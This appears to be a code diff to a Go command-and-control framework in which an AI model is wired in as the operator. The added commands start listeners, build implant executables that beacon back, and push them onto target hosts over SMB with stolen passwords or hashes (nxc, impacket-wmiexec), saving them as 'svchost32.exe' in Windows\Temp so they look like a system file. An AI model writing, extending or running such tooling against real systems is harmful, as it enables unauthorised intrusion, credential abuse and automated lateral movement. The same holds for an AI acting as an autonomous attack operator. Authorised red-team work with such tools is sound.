@@ -20,14 +20,16 @@ type aiGUIEvent struct {
 }
 
 type aiGUISession struct {
-	mu       sync.Mutex
-	running  bool
-	stepMode bool
-	stepCh   chan string
-	stopCh   chan struct{}
-	out      chan aiGUIEvent
-	client   *Client
-	agentID  string
+	mu          sync.Mutex
+	running     bool
+	stepMode    bool
+	stepCh      chan string
+	stopCh      chan struct{}
+	out         chan aiGUIEvent
+	client      *Client
+	agentID     string
+	builtAgent  string // path to last built agent.exe on the C2 server
+	listenerURL string // e.g. "http://10.7.10.165:8080"
 }
 
 var globalAISess struct {
@@ -284,12 +286,160 @@ func (s *aiGUISession) execCmd(cmdLine string) string {
 			fmt.Fprintf(&sb, "%s  %s@%s  %s  %s  %s\n", id, a.Username, a.Hostname, a.IP, a.Transport, status)
 		}
 		return sb.String()
+
 	case "use":
 		if len(args) == 0 {
 			return "[error: use <id>]"
 		}
 		s.agentID = args[0]
 		return "[agent selected: " + args[0] + "]"
+
+	// ── listener management ──────────────────────────────────────────────
+	case "listener":
+		if len(args) == 0 {
+			return "[error: listener start <proto> <port> | listener list]"
+		}
+		switch args[0] {
+		case "list":
+			raw, err := s.client.Jobs()
+			if err != nil {
+				return "[error: " + err.Error() + "]"
+			}
+			return string(raw)
+		case "start":
+			if len(args) < 3 {
+				return "[error: listener start <proto> <port>]"
+			}
+			proto := args[1]
+			port := 0
+			fmt.Sscanf(args[2], "%d", &port)
+			jobID, err := s.client.StartListener(proto, port)
+			if err != nil {
+				return "[error starting listener: " + err.Error() + "]"
+			}
+			return fmt.Sprintf("[listener started: %s port %d job_id=%d]", proto, port, jobID)
+		}
+		return "[error: listener start <proto> <port> | listener list]"
+
+	// ── build agent payload ──────────────────────────────────────────────
+	// Usage: build http <kali_ip> [port] [sleep]
+	case "build":
+		if len(args) < 2 {
+			return "[error: build <transport> <c2_ip> [port] [sleep_sec]]"
+		}
+		transport := args[0]
+		c2ip := args[1]
+		port := 8080
+		sleepSec := 5
+		if len(args) >= 3 {
+			fmt.Sscanf(args[2], "%d", &port)
+		}
+		if len(args) >= 4 {
+			fmt.Sscanf(args[3], "%d", &sleepSec)
+		}
+		serverURL := fmt.Sprintf("%s://%s:%d", transport, c2ip, port)
+		s.listenerURL = serverURL
+		cfg := map[string]any{
+			"server_url": serverURL,
+			"transport":  transport,
+			"sleep_sec":  sleepSec,
+			"jitter_pct": 20,
+		}
+		result, err := s.client.Build(cfg)
+		if err != nil {
+			return "[error building agent: " + err.Error() + "]"
+		}
+		// Store the exe path for later delivery
+		if exePath, ok := result["exe"]; ok && exePath != "" {
+			s.builtAgent = exePath
+			return fmt.Sprintf("[agent built: %s | url: %s]", exePath, serverURL)
+		}
+		// Try other common response keys
+		for _, k := range []string{"path", "file", "output"} {
+			if v, ok := result[k]; ok && v != "" {
+				s.builtAgent = v
+				return fmt.Sprintf("[agent built: %s | url: %s]", v, serverURL)
+			}
+		}
+		return fmt.Sprintf("[build result: %v]", result)
+
+	// ── deliver agent to target ──────────────────────────────────────────
+	// Usage: deliver <target_ip> -u <user> [-p <pass>|-H <hash>] [-d <domain>]
+	case "deliver":
+		if s.builtAgent == "" {
+			return "[error: no agent built yet — run 'build http <kali_ip> <port>' first]"
+		}
+		if len(args) == 0 {
+			return "[error: deliver <target_ip> -u <user> [-p <pass>|-H <hash>] [-d <domain>]]"
+		}
+		_, domain, user, pass, hash, _ := parseAIArgs(args)
+		targetIP := args[0]
+		remotePath := `C:\Windows\Temp\svchost32.exe`
+
+		var uploadCmd, execCmd string
+		if hash != "" {
+			uploadCmd = fmt.Sprintf(
+				"nxc smb %s -u '%s' -H '%s' -d '%s' --put-file '%s' '%s' 2>&1",
+				targetIP, user, hash, domain, s.builtAgent, remotePath)
+			execCmd = fmt.Sprintf(
+				"impacket-wmiexec %s/%s@%s -hashes %s '%s' 2>&1",
+				domain, user, targetIP, hash, remotePath)
+		} else {
+			uploadCmd = fmt.Sprintf(
+				"nxc smb %s -u '%s' -p '%s' -d '%s' --put-file '%s' '%s' 2>&1",
+				targetIP, user, pass, domain, s.builtAgent, remotePath)
+			execCmd = fmt.Sprintf(
+				"impacket-wmiexec %s/%s:'%s'@%s '%s' 2>&1",
+				domain, user, pass, targetIP, remotePath)
+		}
+
+		out1 := execLocalTool(uploadCmd)
+		if strings.Contains(strings.ToLower(out1), "error") && !strings.Contains(out1, "SUCCEED") {
+			return fmt.Sprintf("[upload result]\n%s", out1)
+		}
+		// Small delay to ensure file is written before execution
+		time.Sleep(2 * time.Second)
+		out2 := execLocalTool(execCmd)
+		return fmt.Sprintf("[upload]\n%s\n[execute]\n%s", out1, out2)
+
+	// ── wait for new agent beacon ─────────────────────────────────────────
+	// Usage: wait_agent [timeout_seconds]
+	case "wait_agent":
+		timeout := 120
+		if len(args) > 0 {
+			fmt.Sscanf(args[0], "%d", &timeout)
+		}
+		// Snapshot current agent IDs
+		raw0, _ := s.client.Agents()
+		var before []*server.Agent
+		json.Unmarshal(raw0, &before)
+		knownIDs := map[string]bool{}
+		for _, a := range before {
+			knownIDs[a.ID] = true
+		}
+		deadline := time.Now().Add(time.Duration(timeout) * time.Second)
+		for time.Now().Before(deadline) {
+			select {
+			case <-s.stopCh:
+				return "[stopped]"
+			default:
+			}
+			time.Sleep(8 * time.Second)
+			raw, err := s.client.Agents()
+			if err != nil {
+				continue
+			}
+			var current []*server.Agent
+			json.Unmarshal(raw, &current)
+			for _, a := range current {
+				if !knownIDs[a.ID] && a.Active {
+					s.agentID = a.ID[:8]
+					return fmt.Sprintf("[new agent connected: %s@%s (%s) — agent selected]",
+						a.Username, a.Hostname, a.IP)
+				}
+			}
+		}
+		return fmt.Sprintf("[wait_agent: no new beacon after %ds]", timeout)
 	}
 
 	if s.agentID != "" {
@@ -405,13 +555,50 @@ func (s *aiGUISession) run(target, domain, model, ollamaURL, provider, apiKey st
 
 		s.emit("thinking", fmt.Sprintf("Iteration %d/%d — querying AI...", iter, aiMaxIter), iter)
 
-		response, err := aiChat(provider, ollamaURL, apiKey, model, msgs)
+		var response string
+		var err error
+		if provider == "ollama" {
+			// Stream tokens so the operator sees the model think in real-time.
+			// We batch tokens into ~80-char chunks to avoid flooding the SSE channel.
+			var batch strings.Builder
+			response, err = ollamaChatStream(ollamaURL, model, msgs, func(tok string, think bool) {
+				batch.WriteString(tok)
+				// Flush on newline or when batch is long enough
+				if strings.ContainsAny(tok, "\n") || batch.Len() > 80 {
+					evType := "token"
+					if think {
+						evType = "token_think"
+					}
+					select {
+					case <-s.stopCh:
+						return
+					default:
+						s.emit(evType, batch.String(), iter)
+					}
+					batch.Reset()
+				}
+			})
+			// Flush remainder
+			if batch.Len() > 0 {
+				s.emit("token", batch.String(), iter)
+			}
+		} else {
+			response, err = aiChat(provider, ollamaURL, apiKey, model, msgs)
+		}
 		if err != nil {
 			s.emit("error", "AI error: "+err.Error())
 			return
 		}
+		s.emit("stream_end", "", iter)
 
-		reasoning := strings.TrimSpace(reCmdTag.ReplaceAllString(response, ""))
+		// Extract <think> block for collapsible display
+		thinkMatches := reThinkBlock.FindStringSubmatch(response)
+		cleanResponse := reThinkBlock.ReplaceAllString(response, "")
+		if len(thinkMatches) > 1 {
+			s.emit("think_block", strings.TrimSpace(thinkMatches[1]), iter)
+		}
+
+		reasoning := strings.TrimSpace(reCmdTag.ReplaceAllString(cleanResponse, ""))
 		reasoning = strings.TrimSpace(reDoneTag.ReplaceAllString(reasoning, ""))
 		if reasoning != "" {
 			s.emit("reason", reasoning, iter)
